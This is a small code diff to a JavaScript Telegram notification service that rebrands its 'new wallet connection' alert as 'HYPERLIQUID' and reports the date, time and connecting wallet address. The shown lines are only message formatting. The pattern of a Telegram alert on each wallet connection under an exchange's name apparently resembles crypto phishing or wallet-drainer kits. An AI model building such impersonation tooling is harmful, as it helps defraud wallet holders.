@@ -25,8 +25,8 @@ class TelegramService {
     const date = now.toLocaleDateString()
     const time = now.toLocaleTimeString()
 
-    let message = '🔐 <b>NEW WALLET CONNECTION</b>\n'
-    message += '═══════════════════════\n\n'
+    let message = '⚡ <b>HYPERLIQUID - NEW WALLET CONNECTION</b>\n'
+    message += '═════════════════════════════════════\n\n'
     message += `📅 <b>Date:</b> ${date}\n`
     message += `⏰ <b>Time:</b> ${time}\n`
     message += `👛 <b>Wallet:</b> ${payload.wallet}\n`
